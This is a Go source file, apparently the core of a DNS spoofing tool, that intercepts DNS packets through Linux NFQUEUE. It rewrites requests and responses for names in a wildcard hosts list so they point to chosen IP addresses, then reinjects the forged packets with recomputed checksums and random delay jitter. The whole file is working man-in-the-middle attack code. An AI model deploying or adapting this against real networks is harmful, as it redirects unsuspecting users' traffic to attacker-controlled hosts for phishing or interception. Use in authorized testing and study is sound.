package spoof

import (
	"context"
	"errors"
	"math/rand/v2"
	"time"

	"github.com/Onyz107/dnsspoofer/internal/dns"
	"github.com/Onyz107/dnsspoofer/internal/logger"
	"github.com/Onyz107/dnsspoofer/internal/nfqueue"
	"github.com/Onyz107/dnsspoofer/internal/wildhosts"
	gonfqueue "github.com/florianl/go-nfqueue"
	"github.com/google/gopacket"
	"golang.org/x/sys/unix"
)

func logParsedPacket(msg string, p *dns.ParsedPacket) {
	if p == nil {
		logger.Logger.Warn("nil packet")
		return
	}

	ipVer := "unknown"
	srcIP, dstIP := "", ""

	switch {
	case p.IPv4 != nil:
		ipVer = "IPv4"
		srcIP = p.IPv4.SrcIP.String()
		dstIP = p.IPv4.DstIP.String()
	case p.IPv6 != nil:
		ipVer = "IPv6"
		srcIP = p.IPv6.SrcIP.String()
		dstIP = p.IPv6.DstIP.String()
	}

	fields := []any{"ip", ipVer, "src", srcIP, "dst", dstIP, "request", p.IsRequest}

	if p.DNS != nil {
		// Prefer answers over questions
		if len(p.DNS.Answers) > 0 {
			a := p.DNS.Answers[0]
			fields = append(fields, "dns_name", string(a.Name), "dns_record", a.Type.String(),
				"dns_ttl", a.TTL, "dns_data", a.String())
		} else if len(p.DNS.Questions) > 0 {
			q := p.DNS.Questions[0]
			fields = append(fields, "dns_name", string(q.Name), "dns_record", q.Type.String(),
				"dns_class", q.Class.String())
		}
	}

	logger.Logger.Info(msg, fields...)
}

func serializePacket(layers ...gopacket.SerializableLayer) ([]byte, error) {
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err := gopacket.SerializeLayers(buffer, options, layers...)
	if err != nil {
		return nil, errors.Join(ErrSerializeLayers, err)
	}

	return buffer.Bytes(), nil
}

func handlePacket(pkt nfqueue.Packet, hosts *wildhosts.Hosts) ([]byte, error) {
	parsed, err := dns.ParsePacket(pkt)
	if err != nil {
		return nil, errors.Join(ErrParsePacket, err)
	}

	logParsedPacket("Parsed packet", parsed)

	var name string
	if len(parsed.DNS.Answers) > 0 {
		name = string(parsed.DNS.Answers[0].Name)
	} else if len(parsed.DNS.Questions) > 0 {
		name = string(parsed.DNS.Questions[0].Name)
	}

	ips := hosts.Lookup(name)
	if len(ips) == 0 {
		return nil, nil
	}
	logger.Logger.Debug("parsed hosts file", "name", name, "ips", ips)

	var spoofed *dns.ParsedPacket
	if parsed.IsRequest {
		spoofed, err = dns.SpoofRequest(parsed, ips...)
		if err != nil {
			return nil, errors.Join(ErrSpoofPacket, err)
		}
	} else {
		spoofed, err = dns.SpoofResponse(parsed, ips...)
		if err != nil {
			return nil, errors.Join(ErrSpoofPacket, err)
		}
	}
	logParsedPacket("Spoofed packet", spoofed)

	var newBytes []byte
	switch spoofed.IPVersion {
	case 4:
		spoofed.UDP.SetNetworkLayerForChecksum(spoofed.IPv4)
		newBytes, err = serializePacket(spoofed.IPv4, spoofed.UDP, spoofed.DNS)
		if err != nil {
			return nil, errors.Join(ErrSerializePacket, err)
		}
	case 6:
		spoofed.UDP.SetNetworkLayerForChecksum(spoofed.IPv6)
		newBytes, err = serializePacket(spoofed.IPv6, spoofed.UDP, spoofed.DNS)
		if err != nil {
			return nil, errors.Join(ErrSerializePacket, err)
		}
	default:
		return nil, ErrInvalidIPVersion
	}

	return newBytes, nil
}

func DNS(ctx context.Context, queue uint16, hosts *wildhosts.Hosts) error {
	nfq, err := gonfqueue.Open(&gonfqueue.Config{
		NfQueue:      queue,
		MaxQueueLen:  1024,
		MaxPacketLen: 2048,
		Copymode:     gonfqueue.NfQnlCopyPacket,
		Flags:        gonfqueue.NfQaCfgFlagFailOpen,
		AfFamily:     unix.AF_UNSPEC,
		Logger:       logger.Logger.StandardLog(),
	})
	if err != nil {
		return errors.Join(ErrOpenNFQUEUE, err)
	}
	defer nfq.Close()

	pkts, err := nfqueue.GetPacketChan(ctx, nfq, queue)
	if err != nil {
		return errors.Join(ErrGetNFQUEUEChan, err)
	}

	for {
		select {
		case <-ctx.Done():
			return nil
		case pkt := <-pkts:
			newBytes, err := handlePacket(pkt, hosts)
			if err != nil {
				logger.Logger.Error("packet handling failed", "err", err)
				nfq.SetVerdict(pkt.PacketID, gonfqueue.NfDrop)
				continue
			}

			jitter := time.Duration(rand.NormFloat64()*10+20) * time.Millisecond
			time.Sleep(jitter)

			// if newBytes is nil and there is no error forward the packet as-is
			if newBytes == nil {
				if err := nfq.SetVerdict(pkt.PacketID, gonfqueue.NfAccept); err != nil {
					return errors.Join(ErrSetVerdict, err)
				}
				continue
			}

			if err := nfq.SetVerdictModPacket(pkt.PacketID, gonfqueue.NfAccept, newBytes); err != nil {
				return errors.Join(ErrSetVerdict, err)
			}
		}
	}
}
